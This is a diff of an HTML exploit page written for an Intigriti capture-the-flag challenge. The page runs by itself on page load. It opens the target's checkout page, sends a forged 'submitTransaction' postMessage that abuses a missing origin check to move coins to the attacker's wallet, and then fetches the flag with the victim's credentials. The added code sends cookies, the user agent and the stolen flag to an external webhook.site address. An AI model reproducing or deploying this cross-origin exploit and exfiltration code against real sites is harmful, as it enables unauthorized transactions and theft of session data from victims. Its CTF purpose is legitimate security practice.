@@ -1,61 +1,120 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>Intigriti Challenge - Exploit with Webhook Logging</title>
+    <style>
+        body { font-family: monospace; padding: 20px; background: #1a1a1a; color: #0f0; }
+        h1 { color: #0f0; }
+        #status { color: #ff0; }
+        #log { color: #0ff; font-size: 12px; }
+    </style>
 </head>
 <body>
-    <h1>Intigriti Challenge - Simple CSRF Exploit</h1>
-    <p id="status">Starting...</p>
+    <h1>Intigriti Challenge - Exploit with Webhook Logging</h1>
+    <p id="status">Initializing...</p>
+    <pre id="log">Waiting for bot visit...</pre>
 
     <script>
         const TARGET = 'https://challenge-0126.intigriti.io';
         const OUR_WALLET = '16472226db03703a192aa383237035a69f';
+        const WEBHOOK = 'https://webhook.site/559ade6c-87d4-40bd-8ade-5c8d6e3cfae2';
+
+        // Log to webhook
+        function log(message, data = {}) {
+            console.log(message, data);
+            const logEl = document.getElementById('log');
+            logEl.textContent += '\n' + message;
+
+            // Send to webhook
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                mode: 'no-cors',
+                body: JSON.stringify({
+                    timestamp: new Date().toISOString(),
+                    message: message,
+                    data: data
+                })
+            }).catch(() => {}); // Ignore CORS errors
+        }
+
+        // Log page load
+        log('PAGE_LOADED', {
+            url: window.location.href,
+            userAgent: navigator.userAgent,
+            cookies: document.cookie
+        });
 
         async function exploit() {
-            const status = document.getElementById('status');
-            
-            status.textContent = 'Opening checkout.html...';
-            
-            // Open checkout.html in same-origin context
-            const checkout = window.open(
-                TARGET + '/checkout.html?currency=1337COIN&price=1',
-                'checkout',
-                'width=500,height=600'
-            );
+            log('EXPLOIT_START', { wallet: OUR_WALLET });
+            document.getElementById('status').textContent = 'Opening checkout.html...';
 
-            // Wait for page to load
-            await new Promise(r => setTimeout(r, 2000));
+            try {
+                // Open checkout.html
+                log('OPENING_CHECKOUT', { url: TARGET + '/checkout.html?currency=1337COIN&price=1' });
+                const checkout = window.open(
+                    TARGET + '/checkout.html?currency=1337COIN&price=1',
+                    'checkout',
+                    'width=500,height=600'
+                );
 
-            status.textContent = 'Sending postMessage to submit transaction...';
-            
-            // Send transaction via postMessage (NO ORIGIN CHECK!)
-            checkout.postMessage({
-                type: 'submitTransaction',
-                transaction: {
+                await new Promise(r => setTimeout(r, 2000));
+
+                log('CHECKOUT_OPENED');
+                document.getElementById('status').textContent = 'Sending postMessage...';
+
+                // Send postMessage
+                const transaction = {
                     toAddress: OUR_WALLET,
                     currency: '1337COIN',
                     amount: 1
-                }
-            }, '*');
+                };
 
-            status.textContent = 'Transaction submitted! Admin sends 1 1337COIN to ' + OUR_WALLET;
-            
-            // After transaction, get flag
-            setTimeout(async () => {
-                status.textContent = 'Getting flag...';
-                const response = await fetch(TARGET + '/api/me', { credentials: 'include' });
-                const data = await response.json();
-                if (data.flag) {
-                    status.textContent = 'FLAG: ' + data.flag;
-                    alert('FLAG: ' + data.flag);
-                } else {
-                    status.textContent = 'Waiting for coins...';
-                }
-            }, 5000);
+                log('SENDING_POSTMESSAGE', { transaction });
+
+                checkout.postMessage({
+                    type: 'submitTransaction',
+                    transaction: transaction
+                }, '*');
+
+                log('POSTMESSAGE_SENT');
+                document.getElementById('status').textContent = 'Transaction submitted!';
+
+                // Wait for transaction, then check for flag
+                setTimeout(async () => {
+                    log('CHECKING_FLAG');
+                    document.getElementById('status').textContent = 'Getting flag...';
+
+                    const response = await fetch(TARGET + '/api/me', { credentials: 'include' });
+                    const data = await response.json();
+
+                    log('API_ME_RESPONSE', {
+                        hasFlag: !!data.flag,
+                        flag: data.flag || 'none',
+                        wallets: data.wallets?.map(w => ({ currency: w.currency, address: w.address }))
+                    });
+
+                    if (data.flag) {
+                        document.getElementById('status').textContent = 'FLAG: ' + data.flag;
+                        log('FLAG_FOUND', { flag: data.flag });
+                        alert('FLAG: ' + data.flag);
+                    } else {
+                        document.getElementById('status').textContent = 'No flag yet - waiting...';
+                        log('NO_FLAG_YET');
+                    }
+                }, 5000);
+
+            } catch (error) {
+                log('ERROR', { error: error.message });
+                document.getElementById('status').textContent = 'Error: ' + error.message;
+            }
         }
 
         // Auto-start
-        window.onload = exploit;
+        window.onload = () => {
+            log('WINDOW_ONLOADED');
+            exploit();
+        };
     </script>
 </body>
 </html>
